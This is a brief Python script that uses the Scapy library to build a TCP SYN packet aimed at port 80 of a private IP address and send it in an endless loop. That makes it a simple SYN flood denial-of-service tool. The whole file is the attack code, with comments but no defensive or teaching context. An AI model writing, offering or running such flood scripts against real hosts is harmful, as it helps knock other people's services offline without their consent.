from scapy.all import *

target_ip = "192.168.1.100"  # IP address of the target
target_port = 80  # Target port (e.g., 80 for HTTP)

# Craft SYN packet
packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")

# Send the packet in a loop
send(packet, loop=1)